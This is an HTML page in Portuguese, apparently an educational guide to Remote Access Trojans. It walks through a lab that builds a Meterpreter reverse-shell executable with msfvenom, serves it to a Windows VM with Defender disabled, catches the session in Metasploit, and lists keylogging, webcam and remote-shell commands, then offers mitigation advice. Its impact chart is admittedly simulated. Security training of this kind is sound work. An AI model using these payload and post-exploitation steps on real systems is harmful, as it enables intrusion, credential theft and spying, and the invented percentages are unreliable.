@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT: Guia de Defesa e Laboratório Ético (Remote Access Trojan)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon-green: #38bdf8; /* Blue neon for tech aesthetic */
+            --dark-bg: #111827;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--dark-bg);
+            color: #f3f4f6;
+        }
+        .cyber-card {
+            background-color: #1f2937;
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.5);
+            transition: transform 0.3s;
+        }
+        .cyber-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px rgba(56, 189, 248, 0.8);
+        }
+        .neon-text {
+            color: var(--neon-green);
+            text-shadow: 0 0 5px rgba(56, 189, 248, 0.8);
+        }
+        .cmd-block {
+            font-family: 'Share Tech Mono', monospace;
+            background-color: #0d121c;
+            border-left: 4px solid var(--neon-green);
+            color: #00ff00;
+        }
+        .btn-neon {
+            background-color: transparent;
+            border: 2px solid var(--neon-green);
+            color: var(--neon-green);
+            font-weight: 700;
+            transition: all 0.3s;
+        }
+        .btn-neon:hover {
+            background-color: var(--neon-green);
+            color: #111827;
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+        /* Chart specific styling */
+        .chart-bar {
+            background-color: #3b82f6; /* Blue for corporations */
+            transition: width 1.5s ease-out;
+            height: 24px;
+        }
+        .chart-bar.sm { background-color: #f59e0b; /* Amber */ }
+        .chart-bar.md { background-color: #10b981; /* Emerald */ }
+        .chart-bar.lg { background-color: #ef4444; /* Red */ }
+        .chart-bar.user { background-color: #a855f7; /* Violet */ }
+    </style>
+</head>
+<body class="p-4 sm:p-8 lg:p-12">
+
+    <div class="max-w-7xl mx-auto">
+        <!-- HEADER AND INTRO -->
+        <header class="text-center mb-12">
+            <h1 class="text-5xl sm:text-7xl font-extrabold neon-text mb-2 tracking-wider uppercase">
+                RAT: CONTROLE A SUA DEFESA
+            </h1>
+            <p class="text-xl sm:text-2xl text-gray-400 font-mono">
+                By Ronaldo Rozendo OffSec
+            </p>
+        </header>
+
+        <!-- RAT IMAGE & DEFINITION -->
+        <div class="grid lg:grid-cols-2 gap-8 mb-12">
+            <div class="cyber-card p-6 rounded-xl">
+                <h2 class="text-3xl font-bold neon-text mb-4">O Que é um RAT?</h2>
+                <p class="text-gray-300 mb-4">
+                    RAT significa **Remote Access Trojan** (em português: **Cavalo de Troia de Acesso Remoto**). É um tipo de malware que, após infectar um sistema, permite que um invasor o controle remotamente com discrição, como se estivesse fisicamente na frente da máquina.
+                </p>
+                <p class="text-gray-300">
+                    Ao contrário de um Keylogger simples, um RAT oferece controle total, permitindo ao atacante gerenciar arquivos, controlar a webcam, capturar a tela, roubar credenciais e instalar malwares adicionais. É uma ferramenta de espionagem e controle persistente.
+                </p>
+            </div>
+            <div class="rounded-xl overflow-hidden shadow-2xl border border-gray-700">
+                <img src="https://www.paubox.com/hubfs/What%20are%20remote%20access%20trojans.jpg" alt="Representação visual do Remote Access Trojan (RAT) com um invasor acessando o cérebro da vítima." class="w-full h-auto object-cover">
+            </div>
+        </div>
+        
+
+        <!-- SOCIAL LINKS -->
+        <div class="flex flex-wrap justify-center gap-6 mb-16">
+            <a href="https://www.youtube.com/@ronaldocibertech" target="_blank" class="btn-neon px-6 py-3 rounded-lg shadow-lg">
+                YouTube (Dicas Cyber)
+            </a>
+            <a href="https://www.linkedin.com/in/ronaldo-souza-ciber/" target="_blank" class="btn-neon px-6 py-3 rounded-lg shadow-lg">
+                LinkedIn (Conexão Profissional)
+            </a>
+        </div>
+
+        <!-- 🧪 LABORATÓRIO ÉTICO (DEFENSIVO) -->
+        <section class="mb-16">
+            <h2 class="text-4xl font-bold neon-text mb-6 border-b-2 border-neon-green pb-2">
+                🧪 Laboratório Ético de RAT com Kali e Windows 10 (Host-only)
+            </h2>
+            <p class="text-gray-400 mb-8 italic">
+                Atenção: Este laboratório é estritamente para fins educacionais e defensivos. Garanta que todas as ações sejam realizadas em um ambiente virtualizado isolado (Host-only), sem impacto na rede real ou em sistemas de terceiros.
+            </p>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Passo 1 & 2 -->
+                <div class="cyber-card p-5 rounded-lg">
+                    <h3 class="text-2xl font-semibold mb-2 neon-text">1 & 2. Configuração de Rede e IPs</h3>
+                    <p class="text-gray-300 mb-3">
+                        **Objetivo:** Isolar as VMs e garantir comunicação.
+                    </p>
+                    <ul class="list-disc list-inside space-y-1 text-gray-400">
+                        <li>Configure ambas as VMs (Kali e Windows) com **Adaptador Host-only**.</li>
+                        <li>Verifique a mesma rede (ex: vboxnet0).</li>
+                        <li>Na Kali, use `ip a`. Na Windows, use `ipconfig`.</li>
+                    </ul>
+                </div>
+
+                <!-- Passo 3: Gerar Payload -->
+                <div class="cyber-card p-5 rounded-lg">
+                    <h3 class="text-2xl font-semibold mb-2 neon-text">3. Gerar o Payload Malicioso (msfvenom)</h3>
+                    <p class="text-gray-300 mb-3">
+                        O msfvenom cria um executável que se conectará de volta ao Kali (conexão reversa).
+                    </p>
+                    <div class="cmd-block p-3 rounded-md text-sm break-all">
+                        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=4444 -f exe > Red_teamlab.exe
+                    </div>
+                    <ul class="list-disc list-inside text-xs text-gray-500 mt-2">
+                        <li>LHOST: IP da Kali (Atenção ao IP correto!)</li>
+                        <li>LPORT: Porta de escuta (4444)</li>
+                    </ul>
+                </div>
+
+                <!-- Passo 4 & 5: Servir e Baixar -->
+                <div class="cyber-card p-5 rounded-lg">
+                    <h3 class="text-2xl font-semibold mb-2 neon-text">4 & 5. Distribuição e Execução</h3>
+                    <p class="text-gray-300 mb-3">
+                        Compartilhando o arquivo para simular um download malicioso.
+                    </p>
+                    <p class="text-lg font-mono text-white mb-2">No Kali (Servidor):</p>
+                    <div class="cmd-block p-3 rounded-md text-sm break-all">
+                        python3 -m http.server 8080
+                    </div>
+                    <p class="text-lg font-mono text-white mt-4 mb-2">Na Windows (Baixar):</p>
+                    <div class="cmd-block p-3 rounded-md text-sm break-all">
+                        http://192.168.x.x:8080/Red_teamlab.exe
+                    </div>
+                </div>
+
+                <!-- Passo 6: Desativar Proteções -->
+                <div class="cyber-card p-5 rounded-lg md:col-span-2 lg:col-span-1">
+                    <h3 class="text-2xl font-semibold mb-2 neon-text">6. Desativar Proteções (Apenas Lab)</h3>
+                    <p class="text-gray-300">
+                        Em ambientes de teste, a desativação de seguranças é necessária para a POC (Prova de Conceito). Na VM Windows, desative:
+                    </p>
+                    <ul class="list-disc list-inside space-y-1 text-gray-400 mt-2">
+                        <li>SmartScreen</li>
+                        <li>Windows Defender</li>
+                        <li>CFG e DEP (Configurações de segurança)</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- 🎯 Configurar e Interagir com Metasploit -->
+        <section class="mb-16">
+            <h2 class="text-4xl font-bold neon-text mb-6 border-b-2 border-neon-green pb-2">
+                🎯 7, 8 & 9. Configurar Escuta e Interação Meterpreter
+            </h2>
+
+            <div class="grid lg:grid-cols-2 gap-8">
+                <!-- Metasploit Setup -->
+                <div class="cyber-card p-5 rounded-lg">
+                    <h3 class="text-2xl font-semibold mb-3">Comandos de Escuta (Kali)</h3>
+                    <p class="text-gray-300 mb-4">
+                        Prepara o Kali para receber a conexão reversa do payload.
+                    </p>
+                    <div class="cmd-block p-4 rounded-md space-y-2">
+                        <div><span class="text-green-400 font-bold">$</span> msfconsole</div>
+                        <div><span class="text-green-400 font-bold">></span> use exploit/multi/handler</div>
+                        <div><span class="text-green-400 font-bold">></span> set payload windows/meterpreter/reverse_tcp</div>
+                        <div><span class="text-green-400 font-bold">></span> set LHOST 192.168.x.x</div>
+                        <div><span class="text-green-400 font-bold">></span> set LPORT 4444</div>
+                        <div><span class="text-green-400 font-bold">></span> <span class="text-yellow-400">run</span></div>
+                    </div>
+                    <p class="text-gray-400 mt-4">
+                        (Passo 8: Execute o `Red_teamlab.exe` na Windows. A sessão Meterpreter deve abrir no Kali).
+                    </p>
+                </div>
+
+                <!-- Meterpreter Interaction -->
+                <div class="cyber-card p-5 rounded-lg">
+                    <h3 class="text-2xl font-semibold mb-3">Comandos de Sessão (Meterpreter)</h3>
+                    <p class="text-gray-300 mb-4">
+                        Interagindo e controlando a sessão remota.
+                    </p>
+                    <div class="cmd-block p-4 rounded-md space-y-2">
+                        <div><span class="text-green-400 font-bold">meterpreter ></span> sessions</div>
+                        <div><span class="text-green-400 font-bold">meterpreter ></span> sessions -i 1</div>
+                        <div><span class="text-green-400 font-bold">meterpreter ></span> exit</div>
+                    </div>
+                    <p class="text-gray-400 mt-4">
+                        Use o comando `sessions -i <ID>` para entrar na sessão.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 🧠 10. Comandos Úteis do Meterpreter -->
+        <section class="mb-16">
+            <h2 class="text-4xl font-bold neon-text mb-6 border-b-2 border-neon-green pb-2">
+                🧠 10. Comandos Úteis Dentro do Meterpreter
+            </h2>
+            <div class="overflow-x-auto">
+                <table class="min-w-full divide-y divide-gray-700 rounded-lg overflow-hidden">
+                    <thead class="bg-gray-800">
+                        <tr>
+                            <th class="px-6 py-3 text-left text-sm font-medium text-neon-text uppercase tracking-wider">Comando</th>
+                            <th class="px-6 py-3 text-left text-sm font-medium text-neon-text uppercase tracking-wider">Função</th>
+                        </tr>
+                    </thead>
+                    <tbody class="bg-gray-900 divide-y divide-gray-700">
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">sysinfo</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Mostra informações detalhadas da máquina vítima.</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">getuid</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Mostra o usuário atual da sessão (útil para escalação de privilégios).</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">screenshot</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Captura a tela atual da vítima.</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">keyscan_start</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Inicia o keylogger (captura de teclas digitadas).</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">keyscan_dump / keyscan_stop</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Exibe / Finaliza as teclas capturadas.</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">webcam_snap</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Tenta capturar imagem da webcam da vítima (se disponível).</td>
+                        </tr>
+                        <tr class="hover:bg-gray-800 transition duration-150">
+                            <td class="px-6 py-4 whitespace-nowrap text-sm font-mono text-yellow-300">shell</td>
+                            <td class="px-6 py-4 text-sm text-gray-300">Abre um terminal (prompt de comando ou Bash) remoto na máquina vítima.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- 📈 IMPACTO ESTATÍSTICO (Chart Visualization) -->
+        <section class="mb-16">
+            <h2 class="text-4xl font-bold neon-text mb-6 border-b-2 border-neon-green pb-2">
+                📈 Impacto Estatístico dos Ataques RAT (Simulado)
+            </h2>
+            <p class="text-gray-400 mb-8">
+                Embora os dados exatos variem, os RATs são uma ameaça significativa em todos os níveis. Os gráficos abaixo simulam a porcentagem de impacto/alvo comum em diferentes segmentos.
+            </p>
+
+            <div class="grid md:grid-cols-2 gap-8 text-lg font-mono">
+                <!-- Empresas -->
+                <div class="cyber-card p-6 rounded-xl">
+                    <h3 class="text-xl font-bold mb-4 text-neon-text">Impacto em Empresas (Proporção)</h3>
+                    <div class="space-y-4">
+                        <!-- Pequenas Empresas (SM) -->
+                        <div>
+                            <p class="flex justify-between items-center mb-1">
+                                <span class="text-fuchsia-400">Pequenas Empresas (SM)</span> <span class="text-fuchsia-400">25%</span>
+                            </p>
+                            <div class="h-6 w-full bg-gray-700 rounded-full">
+                                <div class="chart-bar sm rounded-full" style="width: 25%;"></div>
+                            </div>
+                        </div>
+                        <!-- Médias Empresas (MD) -->
+                        <div>
+                            <p class="flex justify-between items-center mb-1">
+                                <span class="text-emerald-400">Médias Empresas (MD)</span> <span class="text-emerald-400">35%</span>
+                            </p>
+                            <div class="h-6 w-full bg-gray-700 rounded-full">
+                                <div class="chart-bar md rounded-full" style="width: 35%;"></div>
+                            </div>
+                        </div>
+                        <!-- Grandes Empresas (LG) -->
+                        <div>
+                            <p class="flex justify-between items-center mb-1">
+                                <span class="text-red-400">Grandes Empresas (LG)</span> <span class="text-red-400">40%</span>
+                            </p>
+                            <div class="h-6 w-full bg-gray-700 rounded-full">
+                                <div class="chart-bar lg rounded-full" style="width: 40%;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Usuários Comuns -->
+                <div class="cyber-card p-6 rounded-xl">
+                    <h3 class="text-xl font-bold mb-4 text-neon-text">Risco para Usuários Comuns</h3>
+                    <p class="text-gray-300 mb-2">
+                        Usuários comuns são alvos constantes devido à menor adoção de soluções EDR e MFA.
+                    </p>
+                    <div class="space-y-4">
+                        <div>
+                            <p class="flex justify-between items-center mb-1">
+                                <span class="text-violet-400">Usuários Domésticos (Alto Risco)</span> <span class="text-violet-400">65%</span>
+                            </p>
+                            <div class="h-6 w-full bg-gray-700 rounded-full">
+                                <div class="chart-bar user rounded-full" style="width: 65%;"></div>
+                            </div>
+                        </div>
+                        <p class="text-sm text-gray-500 pt-4 italic">
+                            O principal vetor de RAT para usuários comuns é o Phishing, com emails disfarçados de faturas ou avisos urgentes.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 🛡️ PERCEPÇÕES FUTURAS E MITIGAÇÃO -->
+        <section class="mb-16">
+            <h2 class="text-4xl font-bold neon-text mb-6 border-b-2 border-neon-green pb-2">
+                🛡️ Percepções Futuras e Estratégias de Mitigação
+            </h2>
+            <div class="grid lg:grid-cols-2 gap-8">
+                <!-- Percepções Futuras -->
+                <div class="cyber-card p-6 rounded-xl">
+                    <h3 class="text-2xl font-semibold mb-3 neon-text">Evolução do RAT (Tendências)</h3>
+                    <ul class="list-disc list-inside space-y-3 text-gray-300">
+                        <li>
+                            **Uso de Golang e Plataformas Legítimas:** RATs modernos, como o Chaos RAT e o AsyncRAT, estão sendo escritos em linguagens multiplataforma (Golang) e usam plataformas legítimas (Dropbox, TryCloudflare) para hospedagem e C2, dificultando a detecção por firewalls tradicionais.
+                        </li>
+                        <li>
+                            **Evasão Avançada:** Os novos RATs usam ofuscação de código e mimetismo de processos legítimos para evitar soluções de segurança baseadas em assinatura. O futuro da detecção está na Análise Comportamental (EDR).
+                        </li>
+                        <li>
+                            **Crescimento do Spyware:** A capacidade de roubar credenciais e gravar teclas continua sendo a principal função, muitas vezes combinada com a vigilância por webcam.
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- Mitigação -->
+                <div class="cyber-card p-6 rounded-xl">
+                    <h3 class="text-2xl font-semibold mb-3 neon-text">Estratégias de Defesa (Para Todos)</h3>
+                    <ul class="list-disc list-inside space-y-3 text-gray-300">
+                        <li>
+                            **MFA (Multi-Factor Authentication):** O uso de MFA minimiza o impacto do roubo de credenciais via RAT, pois o atacante não conseguirá acessar contas protegidas.
+                        </li>
+                        <li>
+                            **Segmentação de Rede (Corporativo):** Limitar a movimentação lateral do RAT. Se uma máquina for infectada, a segmentação impede que o malware se espalhe para sistemas críticos.
+                        </li>
+                        <li>
+                            **EDR (Endpoint Detection and Response):** Soluções EDR monitoram comportamento anômalo, como um programa legítimo tentando iniciar um keylogger ou se conectar a um C2 desconhecido, sendo mais eficazes que antivírus tradicionais.
+                        </li>
+                        <li>
+                            **Higiene Digital (Usuários Comuns):** Manter o sistema operacional e aplicativos atualizados, desconfiar de links e anexos não solicitados (Phishing) e usar um bom software Anti-malware.
+                        </li>
+                        <li>
+                            **Princípio do Menor Privilégio:** Aplicar o princípio do menor privilégio para usuários e sistemas, limitando o que um RAT pode fazer caso obtenha acesso.
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- FOOTER -->
+        <footer class="text-center mt-16 pt-8 border-t border-gray-700">
+            <p class="text-gray-500 text-sm">
+                Este guia foi criado para fins estritamente educacionais e de conscientização em cibersegurança.
+            </p>
+        </footer>
+    </div>
+
+</body>
+</html>
